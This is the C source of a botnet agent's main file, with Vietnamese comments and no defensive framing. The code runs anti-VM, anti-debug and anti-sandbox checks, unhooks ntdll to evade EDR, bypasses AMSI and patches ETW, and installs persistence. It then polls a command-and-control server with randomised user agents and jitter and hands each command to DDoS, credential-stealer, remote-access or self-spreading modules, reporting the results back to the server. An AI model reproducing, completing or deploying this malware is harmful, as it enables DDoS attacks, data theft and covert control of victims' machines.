/**
 * bot_main.c
 * Diem vao chinh cua Bot Agent
 * Chuc nang: anti-analysis, persistence, ket noi C2, vong lap chinh
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <tlhelp32.h>
    #define SLEEP_MS(x) Sleep(x)
    #define GET_PID() GetCurrentProcessId()
#else
    #include <unistd.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #define SLEEP_MS(x) usleep((x) * 1000)
    #define GET_PID() getpid()
#endif

#include "bot_network.h"
#include "bot_crypto.h"
#include "bot_evasion.h"
#include "bot_persistence.h"

/* Bien toan cuc */
static volatile int g_running = 1;
static char g_bot_id[64] = {0};
static char g_encryption_key[128] = {0};
static char g_server_url[256] = {0};

/* Prototype cac ham noi bo */
static void xu_ly_signal(int sig);
static int kiem_tra_mot_instance(void);
static void tao_mutex_file(void);
static void xoa_mutex_file(void);
static void khoi_tao_bot(void);
static void vong_lap_chinh(void);
static void thuc_thi_lenh(const char* lenh_json);
static void bao_cao_ket_qua(const char* cmd_id, const char* ket_qua, int thanh_cong);

/**
 * Ham xu ly signal de thoat bot an toan
 * Dau vao: sig - so hieu signal
 */
static void xu_ly_signal(int sig) {
    (void)sig; /* Tranh canh bao unused parameter */
    g_running = 0;
    printf("[BOT] Nhan signal %d, dang thoat...\n", sig);
}

/**
 * Kiem tra chi cho phep 1 instance chay
 * Tra ve: 1 neu da co instance khac, 0 neu chua co
 */
static int kiem_tra_mot_instance(void) {
#ifdef _WIN32
    HANDLE mutex = CreateMutexA(NULL, FALSE, "Global\\C2Bot_Mutex_Sys");
    if (mutex == NULL) {
        return 1; /* Khong the tao mutex */
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(mutex);
        return 1; /* Da co instance khac */
    }
    /* Giữ mutex cho den khi thoat */
    return 0;
#else
    /* Kiem tra file PID */
    FILE* pid_file = fopen("/tmp/.c2bot.lock", "r");
    if (pid_file != NULL) {
        int pid_cu;
        if (fscanf(pid_file, "%d", &pid_cu) == 1) {
            /* Kiem tra process cu con song khong */
            if (kill(pid_cu, 0) == 0) {
                fclose(pid_file);
                return 1; /* Process cu van dang chay */
            }
        }
        fclose(pid_file);
    }
    return 0;
#endif
}

/**
 * Tao file danh dau instance dang chay
 */
static void tao_mutex_file(void) {
#ifdef _WIN32
    /* Da tao mutex trong kiem_tra_mot_instance */
#else
    FILE* pid_file = fopen("/tmp/.c2bot.lock", "w");
    if (pid_file != NULL) {
        fprintf(pid_file, "%d", (int)GET_PID());
        fclose(pid_file);
    }
#endif
}

/**
 * Xoa file danh dau khi thoat
 */
static void xoa_mutex_file(void) {
#ifndef _WIN32
    unlink("/tmp/.c2bot.lock");
#endif
}

/**
 * Khoi tao bot: evasion, persistence, registry
 */
static void khoi_tao_bot(void) {
    /* Kiem tra moi truong ao */
    if (anti_vm()) {
        printf("[BOT] Phat hien moi truong ao, thoat...\n");
        exit(0);
    }
    
    /* Kiem tra debugger */
    if (anti_debug()) {
        printf("[BOT] Phat hien debugger, thoat...\n");
        exit(0);
    }
    
    /* Kiem tra sandbox */
    if (anti_sandbox()) {
        printf("[BOT] Phat hien sandbox, thoat...\n");
        exit(0);
    }
    
    /* Unhook ntdll de tranh EDR hooking */
    unhook_ntdll();
    
    /* Bypass AMSI tren Windows */
#ifdef _WIN32
    amsi_bypass();
    etw_patch();
#endif
    
    /* Cai dat persistence */
    cai_dat_persistence();
    
    /* Tao mutex de dam bao chi 1 instance */
    tao_mutex_file();
    
    /* Khoi tao seed cho random */
    srand((unsigned int)time(NULL) ^ (unsigned int)GET_PID());
    
    printf("[BOT] Khoi tao hoan tat\n");
}

/**
 * Vong lap chinh: ket noi C2, nhan lenh, thuc thi
 */
static void vong_lap_chinh(void) {
    int lan_thu_lai = 0;
    const int thoi_gian_cho_toi_da = 60; /* Gioi han thoi gian cho giua cac lan ket noi */
    const int thoi_gian_cho_toi_thieu = 10;
    
    while (g_running) {
        /* Tao user agent ngau nhien */
        char user_agent[256];
        tao_user_agent(user_agent, sizeof(user_agent));
        
        /* Thu ket noi den C2 */
        int ket_noi_thanh_cong = ket_noi_c2(g_server_url, g_bot_id, g_encryption_key, user_agent);
        
        if (ket_noi_thanh_cong) {
            lan_thu_lai = 0;
            
            /* Dang ky bot neu chua co ID */
            if (strlen(g_bot_id) == 0) {
                if (dang_ky_bot(g_server_url, g_bot_id, sizeof(g_bot_id), 
                                g_encryption_key, sizeof(g_encryption_key)) != 0) {
                    SLEEP_MS(30000);
                    continue;
                }
            }
            
            /* Checkin va nhan lenh */
            char lenh_json[8192] = {0};
            int co_lenh = checkin_nhan_lenh(g_server_url, g_bot_id, g_encryption_key, 
                                            lenh_json, sizeof(lenh_json));
            
            if (co_lenh > 0) {
                /* Thuc thi lenh */
                thuc_thi_lenh(lenh_json);
            }
            
            /* Ngu mot khoang ngau nhien truoc lan checkin tiep theo */
            int thoi_gian_ngu = thoi_gian_cho_toi_thieu + 
                               (rand() % (thoi_gian_cho_toi_da - thoi_gian_cho_toi_thieu));
            SLEEP_MS(thoi_gian_ngu * 1000);
            
        } else {
            /* Ket noi that bai, tang thoi gian cho */
            lan_thu_lai++;
            if (lan_thu_lai > 10) {
                lan_thu_lai = 10; /* Gioi han so lan thu lai */
            }
            
            int thoi_gian_cho = thoi_gian_cho_toi_thieu * lan_thu_lai;
            if (thoi_gian_cho > thoi_gian_cho_toi_da) {
                thoi_gian_cho = thoi_gian_cho_toi_da;
            }
            
            printf("[BOT] Ket noi that bai, thu lai sau %d giay...\n", thoi_gian_cho);
            SLEEP_MS(thoi_gian_cho * 1000);
        }
    }
}

/**
 * Thuc thi lenh nhan duoc tu C2
 * Dau vao: lenh_json - chuoi JSON chua thong tin lenh
 */
static void thuc_thi_lenh(const char* lenh_json) {
    /* Parse JSON don gian (khong dung library JSON de giam kich thuoc) */
    char cmd_id[64] = {0};
    char module[64] = {0};
    char action[64] = {0};
    char params[2048] = {0};
    
    /* Trich xuat command_id */
    const char* pos = strstr(lenh_json, "\"command_id\"");
    if (pos != NULL) {
        pos = strchr(pos, ':');
        if (pos != NULL) {
            pos++; /* Bo qua dau ':' */
            while (*pos == ' ' || *pos == '"') pos++;
            int i = 0;
            while (*pos != '"' && *pos != '\0' && *pos != ',' && i < 63) {
                cmd_id[i++] = *pos++;
            }
            cmd_id[i] = '\0';
        }
    }
    
    /* Trich xuat module */
    pos = strstr(lenh_json, "\"module\"");
    if (pos != NULL) {
        pos = strchr(pos, ':');
        if (pos != NULL) {
            pos++;
            while (*pos == ' ' || *pos == '"') pos++;
            int i = 0;
            while (*pos != '"' && *pos != '\0' && *pos != ',' && i < 63) {
                module[i++] = *pos++;
            }
            module[i] = '\0';
        }
    }
    
    /* Trich xuat action */
    pos = strstr(lenh_json, "\"action\"");
    if (pos != NULL) {
        pos = strchr(pos, ':');
        if (pos != NULL) {
            pos++;
            while (*pos == ' ' || *pos == '"') pos++;
            int i = 0;
            while (*pos != '"' && *pos != '\0' && *pos != ',' && i < 63) {
                action[i++] = *pos++;
            }
            action[i] = '\0';
        }
    }
    
    /* Trich xuat params */
    pos = strstr(lenh_json, "\"params\"");
    if (pos != NULL) {
        pos = strchr(pos, ':');
        if (pos != NULL) {
            pos++;
            while (*pos == ' ' || *pos == '"') pos++;
            if (*pos == '{') {
                /* Tim dau } tuong ung */
                int depth = 0;
                int i = 0;
                while (*pos != '\0' && i < 2047) {
                    params[i++] = *pos;
                    if (*pos == '{') depth++;
                    if (*pos == '}') {
                        depth--;
                        if (depth == 0) {
                            params[i] = '\0';
                            break;
                        }
                    }
                    pos++;
                }
            } else {
                int i = 0;
                while (*pos != '"' && *pos != '\0' && *pos != ',' && i < 2047) {
                    params[i++] = *pos++;
                }
                params[i] = '\0';
            }
        }
    }
    
    printf("[BOT] Thuc thi lenh: module=%s, action=%s\n", module, action);
    
    /* Dieu phoi den module tuong ung */
    char ket_qua[4096] = {0};
    int thanh_cong = 0;
    
    if (strcmp(module, "ddos") == 0) {
        /* Goi ham DDoS - se duoc dinh nghia trong file ddos */
        extern int thuc_thi_ddos(const char* action, const char* params, char* ket_qua, size_t kich_thuoc_ket_qua);
        thanh_cong = thuc_thi_ddos(action, params, ket_qua, sizeof(ket_qua));
        
    } else if (strcmp(module, "stealer") == 0) {
        /* Goi ham stealer */
        extern int thuc_thi_stealer(const char* action, const char* params, char* ket_qua, size_t kich_thuoc_ket_qua);
        thanh_cong = thuc_thi_stealer(action, params, ket_qua, sizeof(ket_qua));
        
    } else if (strcmp(module, "remote") == 0) {
        /* Goi ham remote access */
        extern int thuc_thi_remote(const char* action, const char* params, char* ket_qua, size_t kich_thuoc_ket_qua);
        thanh_cong = thuc_thi_remote(action, params, ket_qua, sizeof(ket_qua));
        
    } else if (strcmp(module, "spreader") == 0) {
        /* Goi ham spreader */
        extern int thuc_thi_spreader(const char* action, const char* params, char* ket_qua, size_t kich_thuoc_ket_qua);
        thanh_cong = thuc_thi_spreader(action, params, ket_qua, sizeof(ket_qua));
        
    } else {
        snprintf(ket_qua, sizeof(ket_qua), "Module khong duoc ho tro: %s", module);
        thanh_cong = 0;
    }
    
    /* Bao cao ket qua ve C2 */
    bao_cao_ket_qua(cmd_id, ket_qua, thanh_cong);
}

/**
 * Gui ket qua thuc thi lenh ve C2
 * Dau vao: cmd_id - ID cua lenh
 *          ket_qua - chuoi ket qua
 *          thanh_cong - 1 neu thanh cong, 0 neu that bai
 */
static void bao_cao_ket_qua(const char* cmd_id, const char* ket_qua, int thanh_cong) {
    char du_lieu_gui[8192];
    snprintf(du_lieu_gui, sizeof(du_lieu_gui),
             "{\"command_id\":\"%s\",\"status\":\"%s\",\"result\":\"%s\"}",
             cmd_id, thanh_cong ? "completed" : "failed", ket_qua);
    
    gui_ket_qua(g_server_url, g_bot_id, g_encryption_key, du_lieu_gui);
}

/**
 * Ham main - diem vao chinh
 */
int main(int argc, char* argv[]) {
    (void)argc;
    (void)argv;
    
    /* Cai dat signal handler */
    signal(SIGINT, xu_ly_signal);
    signal(SIGTERM, xu_ly_signal);
#ifndef _WIN32
    signal(SIGHUP, xu_ly_signal);
    signal(SIGPIPE, SIG_IGN); /* Bo qua SIGPIPE */
#endif
    
    /* Kiem tra instance duy nhat */
    if (kiem_tra_mot_instance()) {
        printf("[BOT] Da co instance khac dang chay, thoat...\n");
        return 0;
    }
    
    /* Dat server URL */
    strncpy(g_server_url, C2_SERVER_URL, sizeof(g_server_url) - 1);
    
    /* Khoi tao bot */
    khoi_tao_bot();
    
    /* Vao vong lap chinh */
    vong_lap_chinh();
    
    /* Don dep truoc khi thoat */
    xoa_mutex_file();
    
    return 0;
}